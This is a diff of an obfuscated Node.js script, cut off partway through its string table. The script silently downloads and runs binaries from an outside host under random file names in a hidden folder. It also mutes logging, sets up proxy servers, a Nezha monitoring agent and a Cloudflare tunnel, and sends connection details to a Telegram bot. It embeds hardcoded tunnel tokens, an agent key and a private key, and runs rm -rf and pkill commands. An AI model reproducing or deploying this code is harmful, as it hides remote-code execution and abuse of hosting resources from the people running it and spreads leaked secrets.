@@ -1,86 +1,99 @@
 #!/usr/bin/env node
 
-const _0x3e3e40 = _0x60c6
-;(function (_0x375c49, _0x95d43a) {
-  const _0x52fda1 = _0x60c6,
-    _0x5e6354 = _0x375c49()
+const _0x2a1a64 = _0x4856
+function _0x4856(_0x302f0b, _0x2ecfb5) {
+  const _0x7f7cfb = _0x7f7c()
+  return (
+    (_0x4856 = function (_0x4856ae, _0x49bc34) {
+      _0x4856ae = _0x4856ae - 0x143
+      let _0x2e11e4 = _0x7f7cfb[_0x4856ae]
+      return _0x2e11e4
+    }),
+    _0x4856(_0x302f0b, _0x2ecfb5)
+  )
+}
+;(function (_0x5a6447, _0x3be683) {
+  const _0x53d489 = _0x4856,
+    _0x3b41e8 = _0x5a6447()
   while (!![]) {
     try {
-      const _0x346e1d =
-        parseInt(_0x52fda1(0x1d3)) / 0x1 +
-        parseInt(_0x52fda1(0x1b7)) / 0x2 +
-        -parseInt(_0x52fda1(0x1ba)) / 0x3 +
-        (parseInt(_0x52fda1(0x103)) / 0x4) * (-parseInt(_0x52fda1(0x102)) / 0x5) +
-        parseInt(_0x52fda1(0x11b)) / 0x6 +
-        parseInt(_0x52fda1(0x1a4)) / 0x7 +
-        (-parseInt(_0x52fda1(0xe0)) / 0x8) * (parseInt(_0x52fda1(0x18c)) / 0x9)
-      if (_0x346e1d === _0x95d43a) break
-      else _0x5e6354['push'](_0x5e6354['shift']())
-    } catch (_0x164b43) {
-      _0x5e6354['push'](_0x5e6354['shift']())
+      const _0x186899 =
+        parseInt(_0x53d489(0x195)) / 0x1 +
+        (-parseInt(_0x53d489(0x176)) / 0x2) * (-parseInt(_0x53d489(0x14b)) / 0x3) +
+        parseInt(_0x53d489(0x230)) / 0x4 +
+        -parseInt(_0x53d489(0x161)) / 0x5 +
+        parseInt(_0x53d489(0x1a6)) / 0x6 +
+        parseInt(_0x53d489(0x23c)) / 0x7 +
+        -parseInt(_0x53d489(0x20a)) / 0x8
+      if (_0x186899 === _0x3be683) break
+      else _0x3b41e8['push'](_0x3b41e8['shift']())
+    } catch (_0x592a88) {
+      _0x3b41e8['push'](_0x3b41e8['shift']())
     }
   }
-})(_0x59e5, 0x9264b)
-const http = require(_0x3e3e40(0xfb)),
-  axios = require(_0x3e3e40(0x18a)),
+})(_0x7f7c, 0xcdf50)
+const http = require(_0x2a1a64(0x245)),
+  axios = require(_0x2a1a64(0x202)),
   os = require('os'),
   fs = require('fs'),
-  path = require(_0x3e3e40(0xd9)),
-  crypto = require(_0x3e3e40(0xd5)),
-  { promisify } = require(_0x3e3e40(0x132)),
-  { exec: execCommand, execSync } = require(_0x3e3e40(0x171)),
+  path = require(_0x2a1a64(0x1cb)),
+  crypto = require('crypto'),
+  { promisify } = require(_0x2a1a64(0x25d)),
+  { exec: execCommand, execSync } = require(_0x2a1a64(0x233)),
   exec = promisify(execCommand),
-  UPLOAD_URL = process[_0x3e3e40(0xd3)][_0x3e3e40(0x1f6)] || '',
-  PROJECT_URL = process[_0x3e3e40(0xd3)][_0x3e3e40(0xf8)] || '',
-  AUTO_ACCESS = process[_0x3e3e40(0xd3)][_0x3e3e40(0x1be)] || ![],
-  FILE_PATH = process[_0x3e3e40(0xd3)]['FILE_PATH'] || '.npm',
-  NEZHA_SERVER = process[_0x3e3e40(0xd3)][_0x3e3e40(0x1de)] || _0x3e3e40(0x108),
-  NEZHA_PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0xd2)] || '',
-  NEZHA_KEY = process[_0x3e3e40(0xd3)][_0x3e3e40(0x11e)] || _0x3e3e40(0x19b),
-  UUID = process['env'][_0x3e3e40(0x1bd)] || _0x3e3e40(0x13f),
-  ARGO_AUTH = process[_0x3e3e40(0xd3)][_0x3e3e40(0x176)] || _0x3e3e40(0xf3),
-  ARGO_DOMAIN = process[_0x3e3e40(0xd3)][_0x3e3e40(0x1c6)] || 'deployzy.933993.xyz',
-  ARGO_PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0x197)] || 0xe2e1,
-  SUB_PATH = process['env'][_0x3e3e40(0x1d0)] || _0x3e3e40(0x16b),
-  PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0x117)] || process[_0x3e3e40(0xd3)]['PORT'] || 0xbb8,
-  S5_PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0xfd)] || '',
-  HY2_PORT = process[_0x3e3e40(0xd3)]['HY2_PORT'] || '',
-  REALITY_PORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0x19e)] || '',
-  NAME = process['env'][_0x3e3e40(0x1e7)] || _0x3e3e40(0xf0),
-  CFIP = process[_0x3e3e40(0xd3)]['CFIP'] || _0x3e3e40(0x121),
-  CFPORT = process[_0x3e3e40(0xd3)][_0x3e3e40(0x192)] || 0x1bb,
-  CHAT_ID = process[_0x3e3e40(0xd3)][_0x3e3e40(0x10d)] || _0x3e3e40(0x1ed),
-  BOT_TOKEN = process[_0x3e3e40(0xd3)][_0x3e3e40(0x177)] || _0x3e3e40(0x156),
-  SHOW_LOG = ![_0x3e3e40(0x1c5), 'disable', 'no'][_0x3e3e40(0x100)]((process['env']['SHOW_LOG'] || 'false')[_0x3e3e40(0x1c3)]())
-!SHOW_LOG && ((console[_0x3e3e40(0x12d)] = () => {}), (console[_0x3e3e40(0xd1)] = () => {}))
-function alwaysLog(_0x15461f) {
-  const _0x54eae1 = _0x3e3e40
-  process[_0x54eae1(0x123)]['write'](_0x15461f + '\x0a')
+  UPLOAD_URL = process[_0x2a1a64(0x249)][_0x2a1a64(0x223)] || '',
+  PROJECT_URL = process[_0x2a1a64(0x249)][_0x2a1a64(0x1d2)] || '',
+  AUTO_ACCESS = process[_0x2a1a64(0x249)][_0x2a1a64(0x254)] || ![],
+  FILE_PATH = process['env'][_0x2a1a64(0x228)] || _0x2a1a64(0x1db),
+  NEZHA_SERVER = process[_0x2a1a64(0x249)]['NEZHA_SERVER'] || _0x2a1a64(0x16e),
+  NEZHA_PORT = process[_0x2a1a64(0x249)][_0x2a1a64(0x15a)] || '',
+  NEZHA_KEY = process[_0x2a1a64(0x249)][_0x2a1a64(0x20b)] || 'gEzWhb3icySbZsNrdVsWSgOF9q6x4L8B',
+  UUID = process[_0x2a1a64(0x249)]['UUID'] || _0x2a1a64(0x18a),
+  ARGO_AUTH =
+    process[_0x2a1a64(0x249)][_0x2a1a64(0x1f8)] ||
+    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
+  ARGO_DOMAIN = process[_0x2a1a64(0x249)]['ARGO_DOMAIN'] || _0x2a1a64(0x1da),
+  ARGO_PORT = process[_0x2a1a64(0x249)][_0x2a1a64(0x149)] || 0xe2e1,
+  SUB_PATH = process[_0x2a1a64(0x249)][_0x2a1a64(0x210)] || '800',
+  PORT = process[_0x2a1a64(0x249)][_0x2a1a64(0x20f)] || process[_0x2a1a64(0x249)][_0x2a1a64(0x15d)] || 0xbb8,
+  S5_PORT = process[_0x2a1a64(0x249)][_0x2a1a64(0x1f2)] || '',
+  HY2_PORT = process['env'][_0x2a1a64(0x23f)] || '',
+  REALITY_PORT = process['env'][_0x2a1a64(0x1f3)] || '',
+  NAME = process[_0x2a1a64(0x249)][_0x2a1a64(0x193)] || _0x2a1a64(0x261),
+  CFIP = process['env'][_0x2a1a64(0x1a2)] || _0x2a1a64(0x235),
+  CFPORT = process['env'][_0x2a1a64(0x18f)] || 0x1bb,
+  CHAT_ID = process[_0x2a1a64(0x249)]['CHAT_ID'] || _0x2a1a64(0x255),
+  BOT_TOKEN = process[_0x2a1a64(0x249)][_0x2a1a64(0x19c)] || _0x2a1a64(0x188),
+  SHOW_LOG = ![_0x2a1a64(0x24d), _0x2a1a64(0x192), 'no'][_0x2a1a64(0x18c)]((process['env']['SHOW_LOG'] || _0x2a1a64(0x24d))[_0x2a1a64(0x17e)]())
+!SHOW_LOG && ((console[_0x2a1a64(0x189)] = () => {}), (console[_0x2a1a64(0x1ef)] = () => {}))
+function alwaysLog(_0x2e69e2) {
+  const _0x9655d3 = _0x2a1a64
+  process['stdout'][_0x9655d3(0x204)](_0x2e69e2 + '\x0a')
 }
-if (!fs['existsSync'](FILE_PATH)) fs[_0x3e3e40(0x13a)](FILE_PATH)
+if (!fs['existsSync'](FILE_PATH)) fs['mkdirSync'](FILE_PATH)
 else {
 }
-function isValidPort(_0x3df177) {
-  const _0x119226 = _0x3e3e40
+function isValidPort(_0x5ed076) {
+  const _0x239898 = _0x2a1a64
   try {
-    if (_0x3df177 === null || _0x3df177 === undefined || _0x3df177 === '') return ![]
-    if (typeof _0x3df177 === _0x119226(0xdd) && _0x3df177[_0x119226(0x115)]() === '') return ![]
-    const _0x4574c8 = parseInt(_0x3df177)
-    if (isNaN(_0x4574c8)) return ![]
-    if (_0x4574c8 < 0x1 || _0x4574c8 > 0xffff) return ![]
+    if (_0x5ed076 === null || _0x5ed076 === undefined || _0x5ed076 === '') return ![]
+    if (typeof _0x5ed076 === _0x239898(0x153) && _0x5ed076['trim']() === '') return ![]
+    const _0x56f68c = parseInt(_0x5ed076)
+    if (isNaN(_0x56f68c)) return ![]
+    if (_0x56f68c < 0x1 || _0x56f68c > 0xffff) return ![]
     return !![]
-  } catch (_0x409acb) {
+  } catch (_0x1ffe51) {
     return ![]
   }
 }
 function generateRandomName() {
-  const _0x14ac71 = _0x3e3e40,
-    _0x5bd56d = _0x14ac71(0xda)
-  let _0x29195c = ''
-  for (let _0x41976a = 0x0; _0x41976a < 0x6; _0x41976a++) {
-    _0x29195c += _0x5bd56d[_0x14ac71(0x1ec)](Math[_0x14ac71(0xe2)](Math[_0x14ac71(0x1d7)]() * _0x5bd56d[_0x14ac71(0x1c2)]))
+  const _0x316e45 = _0x2a1a64,
+    _0xf317c8 = _0x316e45(0x218)
+  let _0x1aad02 = ''
+  for (let _0x459bb9 = 0x0; _0x459bb9 < 0x6; _0x459bb9++) {
+    _0x1aad02 += _0xf317c8[_0x316e45(0x224)](Math[_0x316e45(0x14e)](Math['random']() * _0xf317c8[_0x316e45(0x1e8)]))
   }
-  return _0x29195c
+  return _0x1aad02
 }
 let subContent = null,
   privateKey = '',
@@ -89,972 +102,939 @@ const npmName = generateRandomName(),
   webName = generateRandomName(),
   botName = generateRandomName(),
   phpName = generateRandomName()
-let npmPath = path[_0x3e3e40(0x1b9)](FILE_PATH, npmName),
-  phpPath = path[_0x3e3e40(0x1b9)](FILE_PATH, phpName),
-  webPath = path[_0x3e3e40(0x1b9)](FILE_PATH, webName),
-  botPath = path['join'](FILE_PATH, botName),
-  subPath = path[_0x3e3e40(0x1b9)](FILE_PATH, _0x3e3e40(0x161)),
-  listPath = path['join'](FILE_PATH, _0x3e3e40(0x1d1)),
-  bootLogPath = path[_0x3e3e40(0x1b9)](FILE_PATH, 'boot.log'),
-  configPath = path[_0x3e3e40(0x1b9)](FILE_PATH, _0x3e3e40(0x128)),
-  certPath = path[_0x3e3e40(0x14c)](FILE_PATH, _0x3e3e40(0x1a3)),
-  keyPath = path[_0x3e3e40(0x14c)](FILE_PATH, _0x3e3e40(0x15e))
+let npmPath = path['join'](FILE_PATH, npmName),
+  phpPath = path[_0x2a1a64(0x157)](FILE_PATH, phpName),
+  webPath = path['join'](FILE_PATH, webName),
+  botPath = path[_0x2a1a64(0x157)](FILE_PATH, botName),
+  subPath = path[_0x2a1a64(0x157)](FILE_PATH, 'sub.txt'),
+  listPath = path[_0x2a1a64(0x157)](FILE_PATH, _0x2a1a64(0x243)),
+  bootLogPath = path[_0x2a1a64(0x157)](FILE_PATH, _0x2a1a64(0x1c5)),
+  configPath = path[_0x2a1a64(0x157)](FILE_PATH, _0x2a1a64(0x1e5)),
+  certPath = path[_0x2a1a64(0x20c)](FILE_PATH, 'cert.pem'),
+  keyPath = path[_0x2a1a64(0x20c)](FILE_PATH, _0x2a1a64(0x19f))
 function deleteNodes() {
-  const _0x3e3e38 = _0x3e3e40
+  const _0x168519 = _0x2a1a64
   try {
     if (!UPLOAD_URL) return
-    if (!fs[_0x3e3e38(0x16a)](subPath)) return
-    let _0x44d2ba
+    if (!fs['existsSync'](subPath)) return
+    let _0xc4844
     try {
-      _0x44d2ba = fs[_0x3e3e38(0x186)](subPath, 'utf-8')
+      _0xc4844 = fs['readFileSync'](subPath, 'utf-8')
     } catch {
       return null
     }
-    const _0x373fd2 = Buffer['from'](_0x44d2ba, _0x3e3e38(0x125))[_0x3e3e38(0xe4)]('utf-8'),
-      _0xb14da2 = _0x373fd2[_0x3e3e38(0x1e9)]('\x0a')[_0x3e3e38(0x1f3)]((_0x6c573e) =>
-        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x3e3e38(0xfc)](_0x6c573e)
+    const _0x2fa820 = Buffer['from'](_0xc4844, _0x168519(0x23e))['toString']('utf-8'),
+      _0x4e9bb9 = _0x2fa820[_0x168519(0x183)]('\x0a')[_0x168519(0x1ba)]((_0x470839) =>
+        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x168519(0x1df)](_0x470839)
       )
-    if (_0xb14da2['length'] === 0x0) return
+    if (_0x4e9bb9[_0x168519(0x1e8)] === 0x0) return
     return (
-      axios[_0x3e3e38(0x168)](UPLOAD_URL + '/api/delete-nodes', JSON[_0x3e3e38(0x109)]({ nodes: _0xb14da2 }), {
+      axios[_0x168519(0x1b6)](UPLOAD_URL + _0x168519(0x1e0), JSON[_0x168519(0x217)]({ nodes: _0x4e9bb9 }), {
         headers: { 'Content-Type': 'application/json' }
-      })[_0x3e3e38(0x12e)]((_0x406dca) => {
+      })[_0x168519(0x17d)]((_0x36f321) => {
         return null
       }),
       null
     )
-  } catch (_0x3ff5d8) {
+  } catch (_0x432e8b) {
     return null
   }
 }
 function cleanupOldFiles() {
-  const _0x489f67 = _0x3e3e40
+  const _0xb2cbcd = _0x2a1a64
   try {
-    const _0x58f72e = fs[_0x489f67(0xee)](FILE_PATH)
-    _0x58f72e[_0x489f67(0x12f)]((_0x198a2e) => {
-      const _0x58ee6a = _0x489f67,
-        _0x2afefc = path[_0x58ee6a(0x1b9)](FILE_PATH, _0x198a2e)
+    const _0x179161 = fs[_0xb2cbcd(0x1b8)](FILE_PATH)
+    _0x179161[_0xb2cbcd(0x237)]((_0x9def84) => {
+      const _0x2795f8 = _0xb2cbcd,
+        _0x4e1c1d = path['join'](FILE_PATH, _0x9def84)
       try {
-        const _0x141850 = fs[_0x58ee6a(0x104)](_0x2afefc)
-        _0x141850[_0x58ee6a(0x1d8)]() && fs[_0x58ee6a(0x1bf)](_0x2afefc)
-      } catch (_0x5753a2) {}
+        const _0x277480 = fs[_0x2795f8(0x229)](_0x4e1c1d)
+        _0x277480[_0x2795f8(0x1cd)]() && fs[_0x2795f8(0x226)](_0x4e1c1d)
+      } catch (_0x2d4b04) {}
     })
-  } catch (_0x267f88) {}
+  } catch (_0x563bf0) {}
 }
 function generateX25519Keypair() {
-  const _0x229b37 = _0x3e3e40,
-    { publicKey: _0x1aabc6, privateKey: _0x202e39 } = crypto['generateKeyPairSync']('x25519'),
-    _0x4ebd43 = _0x202e39[_0x229b37(0x17d)]({ type: _0x229b37(0x124), format: _0x229b37(0x1ae) })['subarray'](-0x20),
-    _0x3c372e = _0x1aabc6[_0x229b37(0x17d)]({ type: _0x229b37(0x1f5), format: 'der' })[_0x229b37(0x1cd)](-0x20)
-  return { privateKey: _0x4ebd43[_0x229b37(0xe4)](_0x229b37(0xdb)), publicKey: _0x3c372e[_0x229b37(0xe4)](_0x229b37(0xdb)) }
+  const _0x465efa = _0x2a1a64,
+    { publicKey: _0x42c41b, privateKey: _0x4ae9e7 } = crypto['generateKeyPairSync'](_0x465efa(0x258)),
+    _0x2c9d68 = _0x4ae9e7[_0x465efa(0x1a8)]({ type: _0x465efa(0x236), format: _0x465efa(0x18d) })[_0x465efa(0x206)](-0x20),
+    _0x5b6b9b = _0x42c41b[_0x465efa(0x1a8)]({ type: _0x465efa(0x182), format: _0x465efa(0x18d) })['subarray'](-0x20)
+  return { privateKey: _0x2c9d68[_0x465efa(0x21d)]('base64url'), publicKey: _0x5b6b9b[_0x465efa(0x21d)](_0x465efa(0x203)) }
 }
 function generateOrLoadKeyPair() {
-  const _0x25e20d = _0x3e3e40,
-    _0x51cc1c = path[_0x25e20d(0x1b9)](FILE_PATH, _0x25e20d(0xe3))
-  if (fs[_0x25e20d(0x16a)](_0x51cc1c)) {
-    const _0x5017ad = fs[_0x25e20d(0x186)](_0x51cc1c, 'utf8'),
-      _0x4ca7cd = _0x5017ad[_0x25e20d(0x153)](/PrivateKey:\s*(.*)/),
-      _0x11d5e9 = _0x5017ad[_0x25e20d(0x153)](/PublicKey:\s*(.*)/)
-    if (_0x4ca7cd && _0x11d5e9) {
-      ;((privateKey = _0x4ca7cd[0x1][_0x25e20d(0x115)]()),
-        (publicKey = _0x11d5e9[0x1][_0x25e20d(0x115)]()),
-        console[_0x25e20d(0x12d)](_0x25e20d(0x101), privateKey),
-        console[_0x25e20d(0x12d)]('Public\x20Key:', publicKey))
+  const _0x3cf2fa = _0x2a1a64,
+    _0x3dd93c = path[_0x3cf2fa(0x157)](FILE_PATH, _0x3cf2fa(0x214))
+  if (fs['existsSync'](_0x3dd93c)) {
+    const _0x361072 = fs['readFileSync'](_0x3dd93c, _0x3cf2fa(0x168)),
+      _0x4e5ae9 = _0x361072['match'](/PrivateKey:\s*(.*)/),
+      _0x5087a2 = _0x361072[_0x3cf2fa(0x22c)](/PublicKey:\s*(.*)/)
+    if (_0x4e5ae9 && _0x5087a2) {
+      ;((privateKey = _0x4e5ae9[0x1][_0x3cf2fa(0x240)]()),
+        (publicKey = _0x5087a2[0x1]['trim']()),
+        console[_0x3cf2fa(0x189)](_0x3cf2fa(0x1b1), privateKey),
+        console[_0x3cf2fa(0x189)](_0x3cf2fa(0x1c4), publicKey))
       return
     }
   }
-  const _0x1e74cc = generateX25519Keypair()
-  ;((privateKey = _0x1e74cc[_0x25e20d(0x170)]),
-    (publicKey = _0x1e74cc[_0x25e20d(0x134)]),
-    fs[_0x25e20d(0x19c)](_0x51cc1c, _0x25e20d(0x147) + privateKey + '\x0aPublicKey:\x20' + publicKey + '\x0a', _0x25e20d(0x1c4)),
-    console[_0x25e20d(0x12d)]('Private\x20Key:', privateKey),
-    console[_0x25e20d(0x12d)](_0x25e20d(0x131), publicKey))
-}
-function _0x60c6(_0x298702, _0x493885) {
-  const _0x59e5a0 = _0x59e5()
-  return (
-    (_0x60c6 = function (_0x60c646, _0x3645dc) {
-      _0x60c646 = _0x60c646 - 0xd1
-      let _0x292f1d = _0x59e5a0[_0x60c646]
-      return _0x292f1d
-    }),
-    _0x60c6(_0x298702, _0x493885)
-  )
+  const _0x2c32c3 = generateX25519Keypair()
+  ;((privateKey = _0x2c32c3[_0x3cf2fa(0x219)]),
+    (publicKey = _0x2c32c3[_0x3cf2fa(0x216)]),
+    fs[_0x3cf2fa(0x16a)](_0x3dd93c, _0x3cf2fa(0x1f5) + privateKey + _0x3cf2fa(0x16f) + publicKey + '\x0a', _0x3cf2fa(0x168)),
+    console[_0x3cf2fa(0x189)](_0x3cf2fa(0x1b1), privateKey),
+    console[_0x3cf2fa(0x189)](_0x3cf2fa(0x1c4), publicKey))
 }
 const FALLBACK_EC_KEY =
     '-----BEGIN\x20EC\x20PARAMETERS-----\x0a' +
-    _0x3e3e40(0x14d) +
-    _0x3e3e40(0x166) +
-    _0x3e3e40(0x105) +
-    _0x3e3e40(0x129) +
-    _0x3e3e40(0x1e1) +
-    _0x3e3e40(0x19a) +
-    _0x3e3e40(0x1f2),
-  FALLBACK_CERT =
-    _0x3e3e40(0x172) +
-    _0x3e3e40(0xf1) +
-    _0x3e3e40(0x138) +
-    _0x3e3e40(0x1da) +
-    _0x3e3e40(0x1cc) +
-    _0x3e3e40(0x198) +
-    _0x3e3e40(0x135) +
-    _0x3e3e40(0x1f7) +
-    _0x3e3e40(0x119) +
-    _0x3e3e40(0x127)
-function ensureTlsCertificates(_0xb83258, _0x28ac72) {
-  const _0x3e07ec = _0x3e3e40
-  if (fs[_0x3e07ec(0x16a)](_0xb83258) && fs['existsSync'](_0x28ac72)) return
-  fs[_0x3e07ec(0x13a)](path['dirname'](_0xb83258), { recursive: !![] })
-  try {
-    ;(execSync(_0x3e07ec(0x1e0), { stdio: _0x3e07ec(0x1df) }),
-      execSync(_0x3e07ec(0x1eb) + _0x28ac72 + '\x22', { stdio: _0x3e07ec(0x1df) }),
-      execSync(_0x3e07ec(0x178) + _0x28ac72 + _0x3e07ec(0x182) + _0xb83258 + _0x3e07ec(0xeb), { stdio: _0x3e07ec(0x1df) }))
-    return
-  } catch (_0x284339) {}
-  ;(fs[_0x3e07ec(0x19c)](_0x28ac72, FALLBACK_EC_KEY), fs['writeFileSync'](_0xb83258, FALLBACK_CERT))
-}
-function _0x59e5() {
-  const _0x1ced02 = [
-    'MarkdownV2',
-    'readFileSync',
-    'password',
-    'createHash',
-    'raw',
-    'axios',
-    '&type=tcp&headerType=none#',
-    '517365QjmPpp',
-    'http://ipv6.ip.sb',
-    '2096',
-    'trojan',
-    'tcp',
-    'https://api.ip.sb/geoip',
-    'CFPORT',
-    '&path=%2Fvless-argo%3Fed%3D2560#',
-    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
-    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
-    'Error\x20executing\x20command:\x20',
-    'ARGO_PORT',
-    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
-    '\x0asocks://',
-    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
-    '59f7oe2oSVOPBD36P6j7BCBLcT5VrdEt',
-    'writeFileSync',
-    '/vless-argo',
-    'REALITY_PORT',
-    'curl\x20-sm\x203\x20ipv4.ip.sb',
-    'blackhole',
-    'success',
-    'data',
-    'cert.pem',
-    '2951599BSIPAp',
-    'arm',
-    'country_code',
-    '\x20-p\x20',
-    'Not\x20Found',
-    'Error\x20in\x20startserver:',
-    'reality',
-    'amd',
-    'status',
-    'https://arm64.oooen.com',
-    'der',
-    '\x0a\x0atrojan://',
-    '&path=%2Ftrojan-argo%3Fed%3D2560#',
-    'unlink',
-    'basename',
-    'vless-in',
-    '\x22\x20>\x20/dev/null\x202>&1',
-    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
-    'boot.log',
-    '1837450fLoGvL',
-    'listen',
-    'join',
-    '3341760BaLgjQ',
-    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
-    'digest',
-    'UUID',
-    'AUTO_ACCESS',
-    'unlinkSync',
-    'TunnelSecret',
-    '\x20is\x20running',
-    'length',
-    'toLowerCase',
-    'utf8',
-    'false',
-    'ARGO_DOMAIN',
-    'slice',
-    'ARGO_DOMAIN:',
-    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
-    'Empowerment\x20success\x20for\x20',
-    '/config.json\x20>/dev/null\x202>&1\x20&',
-    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
-    'subarray',
-    'fileUrls',
-    'hysteria',
-    'SUB_PATH',
-    'list.txt',
-    'http://ip-api.com/json',
-    '267174lewNyv',
-    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
-    'App\x20is\x20running',
-    'writeHead',
-    'random',
-    'isFile',
-    '/dev/null',
-    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
-    '\x22\x20run',
-    'vless',
-    '\x0avless://',
-    'NEZHA_SERVER',
-    'ignore',
-    'openssl\x20version',
-    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
-    'www.iij.ad.jp:443',
-    '/api/add-subscriptions',
-    'tls',
-    'xtls-rprx-vision',
-    'rm\x20-rf\x20',
-    'NAME',
-    'nohup\x20\x22',
-    'split',
-    'true',
-    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
-    'charAt',
-    '7575949494',
-    '/vmess-argo?ed=2560',
-    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
-    '/agent',
-    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
+    _0x2a1a64(0x246) +
+    _0x2a1a64(0x241) +
+    _0x2a1a64(0x1a7) +
+    _0x2a1a64(0x152) +
+    _0x2a1a64(0x22d) +
+    _0x2a1a64(0x1bd) +
     '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
-    'filter',
-    'application/json',
-    'spki',
-    'UPLOAD_URL',
-    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
-    'error',
-    'NEZHA_PORT',
-    'env',
-    'auto',
-    'crypto',
-    '2083',
-    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
-    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
-    'path',
-    'abcdefghijklmnopqrstuvwxyz',
-    'base64url',
-    'none',
-    'string',
-    '/sub.txt\x20saved\x20successfully',
-    'from',
-    '24zpZmIB',
-    'hysteria-in',
-    'floor',
-    'key.txt',
-    'toString',
-    'nohup\x20',
-    '?security=tls&sni=',
-    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
-    '\x0a\x20\x20credentials-file:\x20',
-    'taskkill\x20/f\x20/im\x20',
-    '节点推送**\x0a```',
-    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
-    'vless-tcp-in',
-    '2087',
-    'readdirSync',
-    'firefox',
-    'js-node',
-    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
-    'response',
-    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
-    'Subscription\x20uploaded\x20successfully',
-    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
-    'arch',
-    '2053',
-    'PROJECT_URL',
-    'https+local://8.8.8.8/dns-query',
-    '.download',
-    'http',
-    'test',
-    'S5_PORT',
-    'text/html;\x20charset=utf-8',
-    'platform',
-    'includes',
-    'Private\x20Key:',
-    '256210rbNzUT',
-    '68ULYKTw',
-    'statSync',
-    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
-    'createServer',
-    '\x0a\x20\x20\x20\x20',
-    'nezha.933993.xyz:443',
-    'stringify',
-    'substring',
-    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
-    'https://api.telegram.org/bot',
-    'CHAT_ID',
-    '8443',
-    'has',
-    'createWriteStream',
-    '&fp=firefox&type=ws&host=',
-    '\x20failed:\x20',
-    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
-    'index.html',
-    'trim',
-    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
-    'SERVER_PORT',
-    '?encryption=none&security=tls&sni=',
-    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
-    '\x20-s\x20',
-    '6897360gtRxlj',
-    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
-    'get',
-    'NEZHA_KEY',
-    'npm\x20running\x20error:\x20',
-    'unshift',
-    'mfa.gov.ua',
-    'Download\x20',
-    'stdout',
-    'pkcs8',
-    'base64',
-    '127.0.0.1',
-    '-----END\x20CERTIFICATE-----\x0a',
-    'config.json',
-    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
-    '/vmess-argo',
-    'url',
-    '/web',
-    'log',
-    'catch',
-    'forEach',
-    'tunnel.json',
-    'Public\x20Key:',
-    'util',
-    'http\x20server\x20is\x20running\x20on\x20',
-    'publicKey',
-    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
-    '/v1',
-    'pkill\x20-f\x20\x22[',
-    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
-    'renameSync',
-    'mkdirSync',
-    'end',
-    'Error\x20downloading\x20files:',
-    'automatic\x20access\x20task\x20added\x20successfully',
-    'then',
-    '180233cd-22c9-4144-a559-012e45986dd6',
-    'trojan-ws-in',
-    'push',
-    'utf-8',
-    '.exe\x20>\x20nul\x202>&1',
-    '/trojan-argo',
-    'sha256',
-    'http://ipv4.ip.sb',
-    'PrivateKey:\x20',
-    '&pinSHA256=',
